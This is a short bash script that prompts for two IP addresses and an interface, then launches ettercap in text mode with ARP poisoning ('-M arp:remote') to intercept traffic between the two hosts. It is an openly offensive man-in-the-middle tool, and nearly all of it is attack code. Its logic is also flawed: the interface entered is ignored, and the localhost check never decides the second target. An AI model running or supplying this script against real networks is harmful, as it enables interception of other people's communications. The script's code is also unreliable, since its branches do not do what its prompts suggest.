#!/bin/bash

defaultinterface='wlan0'
smallsleep='on'
autoclear='on'
localhost='127.0.0.1'
# vars #

if [[ $autoclear == 'on' ]]; then
	clear
fi

read -e -p '[IP1]: ' ip1
read -e -p '[IP2]: ' ip2
read -e -p '[InterFace]: ' interface

if [[ $ip2 == "localhost" || $ip2 == "lo" || $ip2 == $localhost || $ip2 == 'lh' || $ip2 == 'lohost' || $ip2 == 'loh' || $ip2 == 'lhost' ]]; then
	lhon='yes'
else
	lhon='no'
fi
if [[ $interface == $defaultinterface || $interface == 'wl' || $interface == 'wl0' || $interface == 'wlan0' || -z $interface ]]; then
	difon='yes'
else
	difon='no'
fi

if [[ $smallsleep == 'on' ]]; then
	sleep 1
	if [[ $autoclear == 'on' ]]; then
		clear
	fi
fi
if [[ $lhon == 'yes' ]]; then
	if [[ $difon == 'yes' ]]; then
		ettercap -T -S -i $defaultinterface -M arp:remote /$ip1// /$localhost//
	elif [[ $difon == 'no' ]]; then
		ettercap -T -S -i $defaultinterface -M arp:remote /$ip1// /$ip2//
	fi
elif [[ $lhon == 'no' ]]; then
	if [[ $difon == 'yes' ]]; then
		ettercap -T -S -i $defaultinterface -M arp:remote /$ip1// /$localhost//
	elif [[ $difon == 'no' ]]; then
		ettercap -T -S -i $defaultinterface -M arp:remote /$ip1// /$ip2//
	fi
fi
